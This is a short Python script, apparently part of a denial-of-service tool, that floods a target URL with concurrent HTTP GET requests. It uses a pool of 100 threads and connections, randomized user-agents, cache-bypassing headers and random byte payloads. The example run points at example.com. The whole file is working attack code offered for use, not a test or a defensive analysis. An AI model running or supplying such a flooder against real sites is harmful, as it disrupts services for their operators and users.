import concurrent.futures
import requests
import random
import tools.randomData as randomData
from colorama import Fore

# Headers
headers = {
    "X-Requested-With": "XMLHttpRequest",
    "Connection": "keep-alive",
    "Pragma": "no-cache",
    "Cache-Control": "no-cache",
    "Accept-Encoding": "gzip, deflate, br",
}


# Tạo đối tượng session và thiết lập timeout và headers
session = requests.Session()
session.headers.update(headers)
session.headers["User-agent"] = randomData.random_useragent()
session.timeout = 4  # Increase the timeout value

# Sử dụng bể kết nối để cải thiện hiệu suất
adapter = requests.adapters.HTTPAdapter(pool_connections=100, pool_maxsize=100)
session.mount('http://', adapter)
session.mount('https://', adapter)

def flood(url):
    payload = str(random._urandom(random.randint(10, 150)))

    try:
        response = session.get(url, params=payload)
        status_code = response.status_code
    except requests.exceptions.RequestException as e:
        print(f"{Fore.MAGENTA}Error while sending GET request\n{Fore.MAGENTA}{e}{Fore.RESET}")
        return

    print(f"{Fore.GREEN}[{status_code}] {Fore.YELLOW}Request sent! Payload size: {len(payload)}.{Fore.RESET}")

def main(url, num_requests):
    with concurrent.futures.ThreadPoolExecutor(max_workers=100) as executor:
        for _ in range(num_requests):
            executor.submit(flood, url)

if __name__ == '__main__':
    main("https://www.example.com", 100)
